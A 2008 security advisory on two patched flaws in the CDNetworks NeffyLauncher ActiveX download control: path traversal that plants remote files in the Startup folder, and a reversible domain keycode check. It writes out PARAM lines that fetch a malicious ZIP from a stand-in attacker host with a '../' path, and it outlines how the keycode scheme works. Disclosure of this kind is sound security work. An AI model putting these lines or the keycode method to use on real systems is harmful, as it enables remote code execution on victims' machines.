@@ -1,0 +1,61 @@
+Title: CDNetworks Nefficient Download(NeffyLauncher.dll) Vulnerabilities
+Author: Simon Ryeo(bar4mi (at) gmail.com, barami (at) ahnlab.com)
+Severity: High
+Impact: Remote Code Execution
+Vulnerable Systems: MS Windows Systems
+Version: NeffyLauncher 1.0.5 {AA07EBD2-EBDD-4BD6-9F8F-114BD513492C}
+Solution: Upgrade the vendor's patch
+Vendor's Homepage: http://www.cdnetworks.com
+Reference: How to stop an ActiveX control from running in Internet Explorer
+          http://support.microsoft.com/kb/240797/ko
+          http://support.microsoft.com/kb/240797/en-us
+History:
+  - 02.27.2008: Initiate notify
+  - 03.06.2008: The vendor patched
+  - After: The vendor are applying the patch to their customers.
+
+Description:
+Neffycient Download is a ActiveX control used to download and to upgrade
+such as game install files through HTTP, FTP, etc. It has two
+vulnerabilities.
+1st, a attacker can copy a malicious file to any path such as start program
+folder(C:\Documents and Settings\All Users\Start Menu\Programs\Startup).
+2nd, a attacker can issue keycodes which are used to restrict execution on
+other domains.
+
+Object:
+I notify this vulnerability not to promote abnormal uses but to make
+a software more secure. This vulnerability was patched by the vendor's
+positive effort. I hope this information helps many people who try
+to study security and to develop an application.
+
+1. Remote Code Execution
+First of all, we must have write permission on a board in a web site used
+this ActiveX or obtain a valid keycode which is correct to your site.
+An Attacker who has a valid keycode can make a expolit by modifying
+HttpSkin,
+SkinPath's values. Malicious files which is on attacker's site must
+be compressed as ZIP file.
+For instance. The below modification copies abnormal files to Windows's
+root directory.
+<PARAM NAME="HttpSkin" VALUE="http://www.attacker.com/maliciousFiles.zip">
+<PARAM NAME="SkinPath" VALUE="../../../../">
+
+In this way an attacker can modify SkinPath's value to All Users's Start
+Program Folder. Then he can execute his malicious program when the user
+restarts his computer.
+
+2. Generating a KeyCode Value
+An attacker can make the keycode generator by debugging this ActiveX
+control. A keycode's value has two meaning. First two digits represent
+the domain's length(hexadecimal).
+Next five(or more) digits are valuable numbers to calculate a domain.
+The keycode check the procedure of this ActiveX control likes below.
+It calculates the keycode's value and returns four bytes as a result.
+Next it starts the domain's calculation and returns four bytes.
+Finally, it compares with these four bytes to check whether the site is
+valid.
+I made a PoC using inline assembly and C. But it doesn't open to the public
+because of the vendor's request. (Just refer above descriptions.)
+
+# milw0rm.com [2008-04-07]
